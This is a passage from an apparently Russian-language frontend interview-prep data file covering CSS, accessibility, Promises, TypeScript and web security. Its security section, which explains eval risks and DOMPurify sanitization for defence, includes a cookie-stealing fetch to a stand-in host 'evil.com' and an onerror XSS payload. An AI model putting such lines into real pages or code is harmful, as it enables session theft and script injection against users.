**Как предотвратить:** добавить padding/border на родителя, \`overflow: hidden\`, \`display: flex/grid\`.
Flexbox и Grid children **не коллапсируют** margins — одна из причин почему grid/flex так удобны.`,score:4},{name:"Семантичные теги, базовые теги",level:"1",content:`Семантические теги: header, main, footer, nav, section, article, aside, figure.

Семантика нужна для: доступности (скринридеры), SEO, читаемости кода.

**section** — блок с конкретной смысловой нагрузкой.
**article** — независимый контент (пост, комментарий).
**div** — нет семантики, для группировки/стилизации.`,score:4.5},{name:"Базовые CSS свойства",level:"1",content:`**display: none** — убирает из потока (нет размеров).
**visibility: hidden** — скрывает, но занимает место.
**opacity: 0** — скрывает, занимает место, реагирует на клики.

**position:** static (по умолчанию), relative (смещение от своего места), absolute (от ближайшего позиционированного предка), fixed (от viewport), sticky (гибрид relative + fixed).`,score:5},{name:"Специфичность селекторов",level:"2",content:`Формула **(a, b, c):**
• a = id
• b = классы, атрибуты, псевдоклассы
• c = теги, псевдоэлементы

\`!important > inline > #id > .class > tag\`

При равной специфичности → каскадность (позже = приоритетнее).`,score:4.5},{name:"Базовые псевдоклассы",level:"2",content:`**Псевдоклассы (:)** — состояние элемента: :hover, :active, :focus, :first-child, :nth-child(n), :not(), :checked, :disabled.

**Псевдоэлементы (::)** — виртуальный элемент: ::before, ::after, ::placeholder, ::selection.

**:nth-child(2)** — второй потомок вообще.
**:nth-of-type(2)** — второй элемент данного типа.

**:focus** — срабатывает при любом фокусе (мышь, клавиатура, программно).
**:focus-visible** — срабатывает только когда фокус виден пользователю — то есть при навигации с клавиатуры.

Зачем: кнопки при клике мышью получают :focus и показывают outline — это раздражает. С :focus-visible outline показывается только при навигации клавиатурой — удобно для accessibility.`,score:5},{name:"Типографика. Шрифты. Подключение шрифтов",level:"3",content:`**@font-face** — подключение локальных шрифтов:
\`\`\`css
@font-face {
  font-family: 'MyFont';
  src: url('./fonts/MyFont.woff2') format('woff2');
  font-display: swap;
}
\`\`\`

**Форматы:** woff2 (лучший, сжатие Brotli), woff (fallback), ttf/otf (старые).

**em vs rem:**
**em** — относительно размера шрифта родителя. Накапливается при вложенности:
\`\`\`css
/* Родитель 16px, дочерний 1.5em = 24px, внук 1.5em = 36px! */
\`\`\`
**rem** — относительно размера шрифта корневого элемента (html). Всегда предсказуемо:
\`\`\`css
html { font-size: 16px; }
.text { font-size: 1.5rem; } /* всегда 24px */
\`\`\`
Поэтому rem предпочтительнее для типографики.

**font-display:**
• **auto** — браузер решает сам
• **block** — текст невидим пока шрифт не загрузится (FOIT)
• **swap** — сразу показывает системный шрифт, потом меняет (FOUT) ✅ чаще всего используют
• **fallback** — короткий период невидимости (100ms), потом системный; если шрифт не успел — остаётся системный
• **optional** — браузер сам решает показывать кастомный шрифт или нет (зависит от скорости соединения)

swap — самый популярный выбор для производительности.`,score:3.5},{name:"PostCSS",level:"3",content:`**PostCSS** — инструмент для трансформации CSS через плагины.

Популярные плагины:
• **postcssPresetEnv** — современный CSS → полифилы (как Babel для CSS)
• **autoprefixer** — вендорные префиксы
• **postcssNested** — вложенность как в SASS
• **postcssMixins** — миксины
• **postcssImport** — @import`,score:4},{name:"Flexbox",level:"3",content:`Одномерная раскладка (строка ИЛИ колонка).

**Центрирование:** display: flex + justify-content: center + align-items: center.

**align-items** — внутри одной строки.
**align-content** — распределяет строки (только при flex-wrap: wrap).

**flex: 1** = flex-grow: 1, flex-shrink: 1, flex-basis: 0%.

**flex-grow** — как много элемент растёт относительно других.
**flex-shrink** — как много элемент сжимается.
**flex-basis** — начальный размер элемента.`,score:4},{name:"Базовое понимание контекста наложения",level:"3",content:`**z-index** работает с позиционированными элементами (relative, absolute, fixed, sticky). Может быть отрицательным.

**Stacking context** создаёт:
• position: absolute/relative/fixed/sticky + z-index не auto
• opacity < 1
• transform не none
• filter не none
• isolation: isolate
• will-change

Дочерний элемент соревнуется только внутри stacking context родителя.

**Главная ловушка** — z-index работает только внутри одного контекста наложения. Элемент с z-index: 9999 не перекроет элемент из другого контекста если его родитель имеет меньший z-index.`,score:3.5},{name:"Современные подходы к организации стилей",level:"3",content:`**CSS-Modules:** автоматические уникальные имена классов.
**CSS-in-JS (styled-components):** стили в JS, динамика через props. Минус: runtime-стоимость.
**Zero-runtime:** vanilla-extract, Linaria, Panda CSS — CSS-in-JS синтаксис, но компиляция в статичный CSS.`,score:3.5},{name:"Базовые свойства Grid",level:"3",content:`Двумерная раскладка (строки И колонки одновременно).

\`\`\`css
.grid {
  display: grid;
  grid-template-columns: 1fr 2fr 1fr;
  grid-template-rows: auto;
  gap: 16px;
}
\`\`\`

**fr** — доля свободного пространства: 1fr 2fr 1fr = 25% 50% 25%.

**grid-area** — размещение элемента по именованным областям.
**minmax(200px, 1fr)** — адаптивные колонки.

**auto-fill** — создаёт колонки даже если элементов нет, пустые колонки занимают место.
**auto-fit** — пустые колонки схлопываются до 0, существующие элементы растягиваются на всю ширину.`,score:4},{name:"Векторная и растровая графика",level:"4",content:`**Растровые форматы:**
• **JPG** — сжатие с потерями, для фото, нет прозрачности
• **PNG** — без потерь, поддерживает прозрачность, тяжелее JPG
• **WebP** — современный формат, меньше JPG/PNG при том же качестве, прозрачность есть
• **AVIF** — ещё новее, ещё лучше сжатие

**SVG:**
• Масштабируется без потери качества
• Можно анимировать через CSS/JS
• Индексируется поисковиками
• Может быть инлайн в HTML

**Когда что использовать:**
• **SVG** — иконки, логотипы, иллюстрации, анимации
• **WebP/AVIF** — фотографии, сложные изображения с градиентами
• **PNG** — когда нужна прозрачность и нет поддержки WebP

**Адаптивные изображения (srcset):**
\`\`\`html
<img
  src="img-800.webp"
  srcset="img-400.webp 400w, img-800.webp 800w, img-1600.webp 1600w"
  sizes="(max-width: 600px) 100vw, 50vw"
  loading="lazy"
  decoding="async"
  alt="..."
/>
\`\`\`
Браузер сам выбирает нужный размер — не грузит лишнего.

**picture с fallback:**
\`\`\`html
<picture>
  <source srcset="img.avif" type="image/avif">
  <source srcset="img.webp" type="image/webp">
  <img src="img.jpg" alt="...">
</picture>
\`\`\`

**SVG inline vs img:**
Inline SVG — можно анимировать и стилизовать через CSS, но не кэшируется.
\`\`\`html
<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24">
  <circle cx="12" cy="12" r="10" fill="currentColor"/>
</svg>
\`\`\`

img tag с SVG — кэшируется браузером, но нельзя стилизовать через CSS.
\`\`\`html
<img src="icon.svg" alt="icon" width="24" height="24">
\`\`\``,score:2},{name:"browserslist",level:"4",content:`Конфиг, определяющий целевые браузеры. Читают: Autoprefixer, Babel, PostCSS Preset Env, ESLint.

\`\`\`json
"browserslist": ["> 1%", "last 2 versions", "not dead"]
\`\`\`

• **> 1%** — браузеры с долей использования больше 1% глобально
• **last 2 versions** — последние 2 версии каждого браузера
• **not dead** — исключает браузеры без официальной поддержки более 2 лет

Все инструменты работают согласованно по одному конфигу.

**Где хранить:**
• **.browserslistrc** — отдельный файл
• **package.json** — поле "browserslist"
• **в конфиге инструмента** — например в postcss.config.js`,score:2.5},{name:"Доступность (aria, tabindex & etc.)",level:"4",content:`**tabindex:** 0 — в порядке DOM, -1 — только программно (focus()), положительный — антипаттерн.

**ARIA атрибуты:**
• **aria-label** — текстовое описание элемента для скринридера (когда нет видимого текста)
• **aria-hidden="true"** — скрывает элемент от скринридера (декоративные иконки)
• **aria-expanded** — состояние раскрытия (аккордеон, дропдаун)
• **aria-live** — объявляет динамические изменения (уведомления, ошибки)
• **role** — явно указывает роль элемента (role="button", role="dialog")

**Первое правило ARIA:** если есть нативный HTML-элемент — используй его вместо ARIA. button лучше чем div с role="button".

**Focus management:**
\`\`\`js
// При открытии модального окна — фокус внутрь
useEffect(() => { if (isOpen) modalRef.current?.focus(); }, [isOpen]);

// При закрытии — вернуть фокус на кнопку открытия
useEffect(() => { if (!isOpen) triggerRef.current?.focus(); }, [isOpen]);
\`\`\`

**Focus trap в модальном окне:**
\`\`\`html
<!-- Современный способ -->
<dialog> <!-- нативный <dialog> имеет встроенный focus trap --> </dialog>

<!-- Или inert атрибут на всё кроме модального -->
<div inert>Контент позади — недоступен Tab, клик, screen reader</div>
\`\`\`

**Клавиатурная навигация (стандарты):**
• Enter/Space — активация button/link
• Escape — закрыть модальное окно, dropdown
• Arrow keys — навигация внутри composite widget (меню, tabs, listbox)

**WCAG контраст:** 4.5:1 для обычного текста, 3:1 для крупного (18px+) и UI элементов.

**aria-live (live regions)** — объявления для screen reader при динамических обновлениях:
\`\`\`html
<div aria-live="polite">Загрузка завершена</div>     <!-- не прерывает чтение -->
<div aria-live="assertive">Критическая ошибка!</div>  <!-- прерывает сразу -->
\`\`\``,score:3}]},{id:"async",title:"АСИНХРОННОСТЬ",icon:"🔄",color:"#FF6B6B",topics:[{name:"XMLHttpRequest, fetch",level:"2",content:`**XMLHttpRequest** — колбэки. **fetch** — промисы.

**fetch при 404/500 — НЕ попадает в catch!** Только сетевые ошибки. Проверять response.ok.

\`\`\`js
fetch('/api').then(res => {
  if (!res.ok) throw new Error(res.status);
  return res.json();
}).catch(err => console.log(err));
\`\`\`

**Отмена запроса:**

 XHR — просто:
\`\`\`js
xhr.abort();
\`\`\`

fetch — через AbortController:
\`\`\`js
const controller = new AbortController();

fetch('/api/data', { signal: controller.signal });

// Отменяем запрос
controller.abort();
\`\`\`
AbortController универсальнее — работает с любым Promise-based API.`,score:3.5},{name:"Механизм Event loop, тасоки и микротасоки",level:"3",content:`**Один тик Event Loop:**
Макротаска → Все микротаски → rAF → Рендеринг → Следующая макротаска

**Микротаски:** Promise.then, queueMicrotask, MutationObserver. Опустошаются полностью.
**rAF:** requestAnimationFrame — перед рендером, НЕ микро и НЕ макро.
**Макротаски:** setTimeout, setInterval, I/O.

Микротаска может породить микротаску → выполнится до макротаски. Бесконечные микротаски → блокировка.`,score:4},{name:"async/await: Синтаксис, обработка ошибок",level:"3",content:`async-функция всегда возвращает Promise.

**await** разрезает функцию: до await — синхронно, после await — микротаска (.then()).

\`\`\`js
async function foo() { console.log(1); await x; console.log(2); }
console.log(3); foo(); console.log(4);
// 3, 1, 4, 2
\`\`\`

**Обработка ошибок:** try/catch или .catch() на промисе.

**return value vs return Promise.resolve(value):** второй на один микротик медленнее.

**Promise методы:**
• **Promise.all(promises)** — ждёт все, падает при первой ошибке. Результат: массив значений в том же порядке.
• **Promise.allSettled(promises)** — ждёт все, не падает. Результат: массив {status, value/reason}.
• **Promise.race(promises)** — возвращает первый завершившийся (fulfilled и rejected). Остальные игнорируются.
• **Promise.any(promises)** — возвращает первый успешный. Если все упали — AggregateError.
• **Promise.resolve(value)** — создаёт уже зарезолвленный Promise.
• **Promise.reject(reason)** — создаёт уже отклонённый Promise.

**Нюансы:**
\`\`\`js
Promise.race([rejected, resolved]) // вернёт rejected — первый завершился
Promise.any([rejected, resolved])  // вернёт resolved — первый успешный
\`\`\`
Promise.all — порядок результатов совпадает с порядком промисов, не с порядком завершения:
\`\`\`js
const [a, b] = await Promise.all([slowRequest, fastRequest]);
// a — результат slowRequest, b — fastRequest
\`\`\`
Promise.allSettled — никогда не попадёт в .catch().
Promise.any — единственный метод который бросает AggregateError (содержит массив всех ошибок).

**Цепочка .then().catch().finally():**
\`\`\`js
fetch('/api')
  .then(res => res.json())          // трансформация
  .catch(err => fallback)           // обработка ошибки, возвращает значение — цепочка продолжается!
  .finally(() => setLoading(false)) // выполняется всегда, не получает значение
\`\`\`

**После .catch() можно продолжить .then()** — если catch не бросает ошибку, цепочка восстанавливается:
\`\`\`js
fetch('/api')
  .then(res => res.json())
  .catch(err => ({ error: true }))  // вернули fallback-значение
  .then(data => render(data))       // выполнится с fallback-значением
\`\`\`
Если внутри .catch() сделать throw — следующие .then() будут пропущены до следующего .catch().`,score:4},{name:"Генераторы и итераторы",level:"4",content:`**Два протокола:**
• **Iterable** — объект с методом [Symbol.iterator]() возвращающим итератор
• **Iterator** — объект с методом next() возвращающим { value, done }

**Ручная реализация итератора:**
\`\`\`js
const iterable = {
  [Symbol.iterator]() {
    let i = 0;
    return {
      next() {
        return i < 3
          ? { value: i++, done: false }
          : { value: undefined, done: true };
      }
    };
  }
};
\`\`\`

**Генератор** — автоматически реализует оба протокола:
\`\`\`js
function* gen() {
  const x = yield 'first';  // строка 1
  const y = yield 'second'; // строка 2
  return x + y;             // строка 3
}
const g = gen();
\`\`\`

**g.next()** — запуск (первый аргумент всегда игнорируется):
• Идёт до первого yield, возвращает \`{ value: 'first', done: false }\`
• Заморожен на строке 1

**g.next('world')** — продолжение:
• 'world' → результат yield 'first' → x = 'world'
• Идёт до следующего yield, возвращает \`{ value: 'second', done: false }\`

**g.next('!')** — продолжение:
• '!' → результат yield 'second' → y = '!'
• Идёт до return, возвращает \`{ value: 'world!', done: true }\`

**Правило:** то что передаёшь в next() — становится результатом предыдущего yield.

**yield* — делегирование:**
\`\`\`js
function* outer() {
  yield 0;
  yield* [1, 2, 3];  // массив
  yield* 'abc';       // строка
  yield* inner();     // другой генератор
}
[...outer()]; // [0, 1, 2, 3, 'a', 'b', 'c']
\`\`\`

**Что работает с итерируемыми:** for...of, [...spread], Array.from(), деструктуризация.
**Встроенные итерируемые:** Array, String, Map, Set, arguments, NodeList, генераторы.

**Практика:**
\`\`\`js
function* idGenerator() {
  let id = 1;
  while (true) yield id++;
}

function* range(start, end) {
  while (start <= end) yield start++;
}
for (const num of range(1, 5)) console.log(num); // 1 2 3 4 5
\`\`\`

**Применение:** Redux-Saga, бесконечные последовательности, ленивые вычисления. async/await под капотом — Babel компилирует в генераторы + промисы.`,score:2.5},{name:"Работа с запросами",level:"2",content:`**Промисы — цепочки:**
• .then() и .catch() всегда возвращают новый промис
• Ошибка пропускает все .then() до ближайшего .catch()
• .catch() без throw — «чинит» цепочку
• .finally() — всегда, не получает аргументов, пропускает значение дальше

**promise.then(ok, err) vs promise.then(ok).catch(err):**
В первом: err НЕ ловит ошибки из ok. Во втором: catch ловит всё.

**Promise combinators:**
\`\`\`js
// Все выполнятся — вернёт массив результатов. Один reject → всё reject.
const [user, posts] = await Promise.all([fetchUser(id), fetchPosts(id)]);

// Все выполнятся — вернёт массив { status, value/reason }. Никогда не reject.
const results = await Promise.allSettled([req1(), req2(), req3()]);
const ok = results.filter(r => r.status === 'fulfilled').map(r => r.value);

// Первый завершившийся (resolve ИЛИ reject) побеждает.
const data = await Promise.race([fetchFromPrimary(), fetchFromFallback()]);

// Первый resolve побеждает. Reject только если ВСЕ упали (AggregateError).
const fastest = await Promise.any([cdn1(), cdn2(), cdn3()]);
\`\`\`

**AbortController** — отмена fetch и любых async операций:
\`\`\`js
const controller = new AbortController();

fetch('/api/data', { signal: controller.signal })
  .catch(e => { if (e.name !== 'AbortError') throw e; });

controller.abort(); // отмена

// В React — отменяем при размонтировании (обязательный паттерн!)
useEffect(() => {
  const controller = new AbortController();
  fetch('/api', { signal: controller.signal }).then(setData);
  return () => controller.abort();
}, []);
\`\`\``}]},{id:"ts",title:"TS",icon:"🔷",color:"#3178C6",topics:[{name:"Основные типы данных в TS",level:"2",content:`**Примитивы:** string, number, boolean, null, undefined, bigint, symbol.

**TS-specific:**
• **any** — отключает проверку
• **unknown** — безопасный any, требует проверки типа
• **never** — функция никогда не завершится (throw, while(true))
• **void** — функция ничего не возвращает
• **tuple** — массив фиксированной длины: [string, number]
• **enum** — набор именованных констант`,score:3},{name:"Keyof, typeof",level:"2",content:`**keyof** — union ключей: keyof User → 'name' | 'age' (НЕ string!)
**typeof** (в TS) — выводит тип из значения: typeof user → { name: string; age: number }

**Комбинация:** keyof typeof obj → union ключей из значения.`,score:3.5},{name:"Interface vs types (extend, |, &)",level:"3",content:`**interface** — declaration merging (повторное объявление объединяется), extends.
**type** — расширение через &, union |, mapped types, conditional types.

**Union (|):** A или B (или оба).
**Intersection (&):** обязательно A и B.

type тоже можно implements в классах.`,score:3.5},{name:"Файлы деклараций .d.ts",level:"3",content:`**.d.ts** — файл только с типами, без реализации. TypeScript читает его чтобы знать что экспортирует модуль, но в JS-бандл он не попадает.

**Зачем нужны:**
JS-библиотека написана на JS — TypeScript не знает её типы. .d.ts даёт ему эту информацию. Можно типизировать любой JS-код не переписывая его.

**Три источника .d.ts:**

**1. Встроены в саму библиотеку** — авторы написали на TypeScript и скомпилировали:
\`\`\`json
// package.json библиотеки
{ "types": "./dist/index.d.ts" }
\`\`\`
TS находит это автоматически.

**2. @types/* пакеты** — отдельный пакет с декларациями для JS-библиотек:
\`\`\`bash
npm i -D @types/react @types/node
\`\`\`
PostedBy сообщество DefinitelyTyped. Устанавливаются как devDependency — в продакшн-бандл не попадают.

**3. Написаны вручную** — для своего JS-кода или внутренних модулей:
\`\`\`ts
// legacy.d.ts — типизируем старый JS-модуль
declare module './legacy/utils' {
  export function formatDate(date: Date): string;
  export function parseId(id: unknown): number;
}
\`\`\`

**declare — ключевое слово в .d.ts:**
Говорит TS "это существует в рантайме, доверяй мне":
\`\`\`ts
// Объявить переменную без значения:
declare const __DEV__: boolean;        // например, вшитая webpack-ом
declare function require(id: string): any;

// Объявить модуль (любой импорт этого пути → any):
declare module '*.svg' {
  const src: string;
  export default src;
}

// Объявить модуль с типами:
declare module 'my-lib' {
  export interface Options { timeout: number; }
  export function init(opts: Options): void;
}
\`\`\`

**declare global — расширение глобального namespace:**
\`\`\`ts
// Добавить свойство к window:
declare global {
  interface Window {
    analytics: Analytics;
    __APP_CONFIG__: AppConfig;
  }
}

// Или расширить существующий тип:
declare global {
  interface Array<T> {
    groupBy(key: keyof T): Record<string, T[]>;
  }
}
\`\`\`
Важно: declare global работает только внутри module-файла (с import/export). В глобальном файле — просто interface Window.

**Автогенерация .d.ts из своего кода:**
\`\`\`json
// tsconfig.json
{ "declaration": true, "declarationDir": "./dist/types" }
\`\`\`
При сборке библиотеки tsc генерирует .d.ts автоматически рядом с JS-файлами. Потребители получат типы без @types.

**Нюанс — ambient vs module declarations:**
Если .d.ts файл не содержит import/export — он ambient (глобальный), типы доступны везде без импорта. Если содержит import/export — это module, типы нужно импортировать явно.`,score:3},{name:"Механизм typeGuard, type cast",level:"3",content:"**Type Guard:** функция с type predicate:\n```ts\nfunction isCat(x: Cat | Dog): x is Cat { return 'meow' in x; }\n```\n\n**Type Cast:** as (основной) и <Type> (не работает в JSX).\nЭто утверждение, не преобразование — в рантайме ничего не происходит.",score:3.5},{name:"UtilityTypes",level:"3",content:`**Partial<T>** — все поля необязательны
**Required<T>** — все поля обязательны
**Readonly<T>** — все поля только для чтения
**Pick<T, K>** — выбирает поля K из T
**Omit<T, K>** — исключает поля K из T
**Record<K, V>** — объект с ключами K и значениями V
**Exclude<T, U>** — убирает из union T типы из U
**Extract<T, U>** — оставляет в union T только типы из U
**NonNullable<T>** — убирает null и undefined
**ReturnType<T>** — тип возврата функции
**Parameters<T>** — типы параметров функции как tuple
**InstanceType<T>** — тип экземпляра класса
**Awaited<T>** — разворачивает Promise
**ConstructorParameters<T>** — типы параметров конструктора`,score:4},{name:"Generics",level:"3",content:"Переиспользуемый код с разными типами:\n```ts\nfunction first<T>(arr: T[]): T { return arr[0]; }\n```\n\n**Ограничения (extends):**\n```ts\nfunction getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {\n  return obj[key]; // TypeScript знает тип возврата\n}\n```\n\n**Дефолтные типы:**\n```ts\ninterface State<T = string> { value: T; }\ntype State1 = State;         // State<string>\ntype State2 = State<number>; // State<number>\n```\n\n**Conditional generics (зависимый возврат):**\n```ts\ntype Flatten<T> = T extends Array<infer Item> ? Item : T;\ntype A = Flatten<string[]>; // string\ntype B = Flatten<number>;   // number\n```\n\n**Variance (вариантность):**\n- **Covariant (ковариантный):** `Dog extends Animal` → `() => Dog` совместим с `() => Animal` (return types — ковариантны)\n- **Contravariant (контравариантный):** `(Animal) => void` → несовместим с `(Dog) => void` (параметры — контравариантны со `strictFunctionTypes`)\n```ts\ntype Logger<T> = (value: T) => void;\n// Если нужен Logger<Animal>, можно передать Logger<Animal>\n// но НЕ Logger<Dog> — т.к. Logger<Animal> ожидает любой Animal\n```",score:4},{name:"Template Literal Types",level:"3",content:`Строковые шаблоны в типах:
\`\`\`ts
type Event = 'click' | 'hover';
type Handler = \\\`on\${Capitalize<Event>}\\\`; // 'onClick' | 'onHover'
\`\`\`

Автоматическая генерация всех комбинаций из union. 
      **Capitalize<T>** — первая буква заглавная: 'hello' → 'Hello'
**Uncapitalize<T>** — первая буква строчная: 'Hello' → 'hello'
**Uppercase<T>** — всё заглавными: 'hello' → 'HELLO'
**Lowercase<T>** — всё строчными: 'HELLO' → 'hello'`,score:3.5},{name:"Conditional types, mapped types, infer",level:"4",content:`**Conditional:** T extends string ? 'yes' : 'no'
**Mapped:** [K in keyof T]?: T[K] — перебор ключей с трансформацией.
**infer:** вытаскивает тип из структуры:
\`\`\`ts
type ReturnType<T> = T extends (...args: any[]) => infer R ? R : never;
\`\`\`

**Distributive (разворачивается по union):**
\`\`\`ts
type ToArray<T> = T extends any ? T[] : never;
type A = ToArray<string | number>; // string[] | number[]

// Чтобы ОТКЛЮЧИТЬ distributive — обернуть в кортеж:
type ToArrayStrict<T> = [T] extends [any] ? T[] : never;
type B = ToArrayStrict<string | number>; // (string | number)[]
\`\`\`

**Mapped type modifiers (+/-):**
\`\`\`ts
type Mutable<T> = { -readonly [K in keyof T]: T[K] };   // убрать readonly
type Optional<T> = { [K in keyof T]+?: T[K] };           // добавить ?
type Required<T> = { [K in keyof T]-?: T[K] };           // убрать ?
\`\`\`

**infer для сложных структур:**
\`\`\`ts
type Unpacked<T> = T extends Promise<infer U> ? U : T;
type Head<T extends any[]> = T extends [infer H, ...any[]] ? H : never;
type Tail<T extends any[]> = T extends [any, ...infer R] ? R : never;

type H = Head<[string, number, boolean]>; // string
type T = Tail<[string, number, boolean]>; // [number, boolean]
\`\`\``,score:3},{name:"Перегрузка функций",level:"4",content:`**Зачем нужна перегрузка:**
Иногда функция ведёт себя по-разному в зависимости от типа аргументов — и возвращаемый тип тоже разный. Без перегрузки TypeScript вывел бы слишком широкий тип и потерял информацию:
\`\`\`ts
// Без перегрузки — TS не знает что именно вернётся:
function wrap(value: string | number): string | number[] { ... }
const result = wrap('hello'); // тип: string | number[] — неточно

// С перегрузкой — TS знает точно:
function wrap(value: string): string;
function wrap(value: number): number[];
function wrap(value: string | number): string | number[] {
  return typeof value === 'string' ? value.toUpperCase() : [value];
}
const a = wrap('hello'); // тип: string ✅
const b = wrap(42);     // тип: number[] ✅
\`\`\`

**Структура:**
\`\`\`ts
// 1. Сигнатуры перегрузок — только для TypeScript, в JS не существуют:
function format(value: string): string;
function format(value: number, decimals: number): string;

// 2. Сигнатура реализации — невидима снаружи, покрывает все варианты:
function format(value: string | number, decimals?: number): string {
  if (typeof value === 'string') return value.trim();
  return value.toFixed(decimals ?? 2);
}

// Вызвать можно только через сигнатуры перегрузок:
format('hello');    // ✅
format(3.14, 1);    // ✅
format(3.14);       // ❌ — не совпадает ни с одной сигнатурой
\`\`\`

**Порядок сигнатур важен — конкретные выше:**
\`\`\`ts
// ✅ Правильно: более конкретный тип выше
function parse(input: 'json'): object;
function parse(input: string): unknown;
function parse(input: string): object | unknown { ... }

// ❌ Неправильно: string поглощает 'json' раньше
function parse(input: string): unknown;
function parse(input: 'json'): object; // никогда не будет выбрана
\`\`\`

**Перегрузка методов класса:**
\`\`\`ts
class EventEmitter {
  on(event: 'data', handler: (data: Buffer) => void): this;
  on(event: 'error', handler: (err: Error) => void): this;
  on(event: string, handler: (...args: any[]) => void): this {
    // реализация
    return this;
  }
}
\`\`\`

**Когда использовать перегрузку, а когда union:**
\`\`\`ts
// Union достаточно — возвращаемый тип не зависит от входного:
function log(value: string | number): void { ... }

// Перегрузка нужна — возвращаемый тип зависит от входного:
function clone(value: string): string;
function clone(value: number): number;
function clone<T>(value: T): T { return value; }
\`\`\`

**Альтернатива — generic с conditional type** (мощнее, но сложнее читается):
\`\`\`ts
function clone<T extends string | number>(value: T): T {
  return value; // TS сохраняет литеральный тип
}
const x = clone('hello'); // тип: 'hello', не string
\`\`\``,score:3},{name:"Reference types",level:"4",content:`Reference types — директивы в начале файла для подключения типов:

**Triple-slash directives:**
\`\`\`ts
/// <reference types="node" />          // подключает @types/node
/// <reference path="./other.d.ts" />   // подключает конкретный файл
/// <reference lib="dom" />             // подключает встроенную библиотеку TS
\`\`\`

В tsconfig.json можно указать \`types\` или \`lib\` глобально для всего проекта.

**Reference директивы нужны когда:**
• Нужен тип только в одном файле — не хочешь подключать глобально
• Автоматически генерируемые .d.ts — компилятор сам добавляет reference чтобы указать зависимости
• Старые проекты — до того как tsconfig стал стандартом

Сейчас в большинстве проектов reference директивы не нужны — всё настраивается через tsconfig.json.`,score:3.5},{name:"Использование tsc",level:"4",content:`**tsc** — компилятор TypeScript. Проверяет типы + компилирует в JS.

**tsconfig.json ключевые настройки:**
• **strict: true** — зонтичный флаг (strictNullChecks, noImplicitAny, и др.)
• **target** — версия JS на выходе (ES5, ES6, ESNext)
• **module** — система модулей (commonjs, esnext)
• **paths** — алиасы импортов
• **include/exclude** — какие файлы компилировать

**strict: true включает:**
• **noImplicitAny** — нельзя неявный any
• **strictNullChecks** — null и undefined не совместимы с другими типами
• **strictFunctionTypes** — строгая проверка типов функций при присваивании
• **strictPropertyInitialization** — все поля класса должны быть инициализированы в конструкторе

**--noEmit** — проверяет типы но не генерирует JS файлы. Используется:
• В CI/CD для проверки типов без сборки
• Когда сборкой занимается другой инструмент (Vite, webpack) а TS только для типов
\`\`\`bash
tsc --noEmit         # только проверка типов
tsc --watch          # следит за изменениями
tsc --noEmit --watch # проверка типов в режиме слежения
\`\`\``,score:3.5}]},{id:"security",title:"БЕЗОПАСНОСТЬ",icon:"🔒",color:"#EF5350",topics:[{name:"eval, dangerouslySetInnerHTML",level:"2",content:`**eval() — выполняет строку как JS-код в рантайме:**
\`\`\`js
eval('alert(1)');              // выполнит alert
eval('fetch("evil.com?" + document.cookie)'); // украдёт куки
\`\`\`

**Почему опасно:**
Если в строку попадают пользовательские данные — атакующий может выполнить любой код с привилегиями текущей страницы: украсть cookies/localStorage, делать запросы от имени пользователя, менять DOM.

**Почему медленно:**
V8 не может оптимизировать код внутри eval — Hidden Classes, Inline Caching, JIT не работают. Плюс eval читает и модифицирует текущий scope — это блокирует ряд оптимизаций всей окружающей функции.

**Альтернативы:**
\`\`\`js
// Вместо eval для вычисления выражений:
new Function('x', 'return x * 2')(5); // изолирован от текущего scope

// Вместо eval для динамических ключей:
const key = 'name';
obj[key]; // просто доступ через переменную

// Вместо eval для JSON:
JSON.parse(str); // безопасно, только данные — не код
\`\`\`
\`new Function()\` тоже небезопасен для пользовательского ввода — изолирует от scope, но всё равно выполняет произвольный код.

---

**dangerouslySetInnerHTML — React-аналог innerHTML:**
\`\`\`jsx
// ❌ Опасно — если html пришёл от пользователя:
<div dangerouslySetInnerHTML={{ __html: userContent }} />
// Если userContent = '<img src=x onerror=alert(1)>' — XSS
\`\`\`

**Санитизация (sanitize)** — это очистка HTML от опасных тегов и атрибутов перед вставкой в DOM. Санитайзер парсит HTML и удаляет: теги \`<script>\`, обработчики событий (\`onerror\`, \`onclick\`, \`onload\`), \`javascript:\` в href/src, и другие векторы XSS.

**DOMPurify — стандартная библиотека для санитизации:**
\`\`\`js
import DOMPurify from 'dompurify';

// Базовое использование:
const clean = DOMPurify.sanitize(dirtyHtml);
// '<script>alert(1)<\/script><b>text</b>' → '<b>text</b>'
// '<img src=x onerror=alert(1)>' → '<img src=x>'

// Разрешить только определённые теги:
const clean = DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href'],
});
\`\`\`

\`\`\`jsx
// ✅ Правильно — всегда санитизировать перед вставкой:
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
\`\`\`

**Когда dangerouslySetInnerHTML вообще нужен:**
• Вывод rich-text из CMS (контент редактора — Quill, TipTap)
• Email-превью в браузере
• Статьи с форматированием из базы

Во всех случаях — только с санитизацией. React специально назвал пропс "dangerously" чтобы разработчик думал дважды.`,score:3.5},{name:"Аутентификация и авторизация, их отличия",level:"2",content:`**Аутентификация (Authentication)** — КТО ты? Проверка личности. Логин/пароль, OAuth, биометрия, токен.

**Авторизация (Authorization)** — ЧТО тебе можно? Проверка прав после того как личность установлена. Роли, permissions, scopes.

Сначала всегда аутентификация — потом авторизация. Без установленной личности незачем проверять права.

---

**Session-based аутентификация:**
\`\`\`
1. Пользователь вводит логин/пароль
2. Сервер проверяет, создаёт сессию в БД/Redis: { sessionId: 'abc', userId: 42, exp: ... }
3. Клиент получает httpOnly cookie с sessionId
4. При каждом запросе браузер автоматически шлёт cookie
5. Сервер смотрит sessionId → находит сессию → знает кто это
\`\`\`
Инвалидация мгновенная — удалил запись в Redis, сессия мертва. Минус: нужен общий Redis при горизонтальном масштабировании.

**JWT-аутентификация:**
\`\`\`
1. Пользователь логинится
2. Сервер создаёт JWT: header.payload.signature
3. Клиент хранит токен и шлёт в заголовке: Authorization: Bearer <token>
4. Сервер проверяет подпись — никакой БД не нужно (stateless)
\`\`\`
\`\`\`js
// Payload JWT (читаем кем угодно — не шифруется!):
{ userId: 42, role: 'admin', exp: 1716000000 }
\`\`\`
Плюс: stateless, легко масштабируется. Минус: нельзя мгновенно инвалидировать — токен живёт до истечения exp.

**Где хранить токены:**

**localStorage** — доступен из JS → украдут через XSS. Нельзя для access/refresh токенов.

**httpOnly cookie** — JS не может прочитать, браузер шлёт автоматически. Уязвим к CSRF, но защищается SameSite=Strict/Lax.

**In-memory (переменная в JS)** — самый безопасный для access token. Но теряется при перезагрузке страницы.

**Token rotation паттерн (лучшая практика):**
\`\`\`
